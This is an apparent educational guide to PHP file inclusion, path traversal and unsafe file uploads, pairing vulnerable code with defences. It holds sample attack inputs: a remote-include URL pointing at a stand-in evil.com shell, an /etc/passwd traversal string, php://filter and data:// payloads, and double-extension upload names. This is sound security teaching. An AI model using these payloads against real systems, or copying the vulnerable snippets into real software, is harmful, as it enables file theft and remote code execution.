# 📂 File Inclusion, Path Traversal & File Upload Vulnerabilities

These vulnerabilities occur when **attacker-controlled input reaches file-related functions (sinks)**. Depending on the sink, an attacker may:

- 📖 Read sensitive files
- ⚡ Execute arbitrary code
- 💾 Write malicious files to the server

PHP **Stream Wrappers** (e.g., `php://filter`, `data://`, `phar://`) can significantly increase the impact.

---

# 📥 Local & Remote File Inclusion (LFI / RFI)

## 🔍 What is File Inclusion?

Occurs when user input reaches:

- `include`
- `require`
- `include_once`
- `require_once`

Since these functions **execute PHP files**, controlling the file path can lead to **code execution**.

### Vulnerable Example

```php
$page = $request->query('page');
include $page . '.php';
```

**Data Flow**

```text
User Input
    │
    ▼
$page
    │
    ▼
include()
```

---

## 🟢 Local File Inclusion (LFI)

Allows attackers to include files **already present on the server**.

Common techniques:

- `../` directory traversal
- Including sensitive files
- Including attacker-controlled log/session files

Example:

```text
?page=../../config/database
```

---

## 🔴 Remote File Inclusion (RFI)

Allows inclusion of **attacker-hosted PHP files**.

Example:

```text
?page=http://evil.com/shell
```

⚠️ Works **only if**:

```ini
allow_url_include = On
```

(Default: **Disabled**)

---

# 🧰 PHP Stream Wrappers

## 📖 `php://filter`

Used to **read PHP source code** instead of executing it.

Example:

```text
php://filter/convert.base64-encode/resource=file
```

Benefits:

- Encodes source code in Base64
- Prevents PHP execution
- Reveals application source code

Useful for reading:

- Configuration files
- Controllers
- Middleware
- Secrets

---

## 💉 `data://`

Allows inline PHP code injection.

Example:

```text
data://text/plain,<?php phpinfo(); ?>
```

⚠️ Requires:

```ini
allow_url_include = On
```

---

# 📂 Path Traversal

Occurs when attacker input reaches file functions such as:

- `readfile()`
- `file_get_contents()`
- `fopen()`

without validating the file path.

### Vulnerable Example

```php
$file = $request->query('file');

readfile("/storage/docs/" . $file);
```

---

## 🔍 Attack

Normal request:

```text
manual.pdf
```

Attacker request:

```text
../../../../../etc/passwd
```

Resolved path:

```text
/storage/docs/../../../../../etc/passwd
```

Result:

- 📖 Read arbitrary files
- 🔓 Access files outside intended directory

---

## 🛡️ Defense

Use:

- ✅ `realpath()`
- ✅ Canonicalize paths
- ✅ Verify final path stays inside intended directory
- ✅ Reject `../` traversal sequences

---

# 📤 File Upload Vulnerabilities

Danger occurs when attackers can upload executable files.

### Vulnerable Example

```php
if (preg_match('/\.(jpg|png)$/i', $name)) {

    move_uploaded_file(...);

}
```

---

## ⚠️ Common Weaknesses

### 📛 Trusting Filename

Client controls:

```text
avatar.jpg
shell.php.jpg
```

---

### 🎭 Double Extensions

Example:

```text
shell.php.jpg
```

May bypass extension checks on some servers.

---

### 📝 Trusting MIME Type

Never trust:

```php
$_FILES['type']
```

It is entirely client-controlled.

---

### 📂 Uploading into Web Root

Example:

```text
/public/uploads/
```

If executable files are stored here, attackers may gain **Remote Code Execution (RCE)**.

---

# 🛡️ Secure Upload Practices

✔️ Validate actual file content (magic bytes)

✔️ Generate server-side filenames

✔️ Store uploads outside the web root

✔️ Serve uploads as static content only

✔️ Never trust:

- Filename
- Extension
- MIME Type

---

# 🎯 Key Takeaways

- 📂 **File Inclusion** occurs when user input reaches `include()` or `require()`.
- 🟢 **LFI** reads or executes local files.
- 🔴 **RFI** executes attacker-hosted files (requires `allow_url_include`).
- 📖 `php://filter` can expose PHP source code via Base64 encoding.
- 📂 **Path Traversal** abuses `../` to access files outside the intended directory.
- 📤 **Unsafe File Uploads** can lead to Remote Code Execution.
- 🛡️ Always validate file paths, inspect file contents, store uploads safely, and avoid trusting user-controlled metadata.
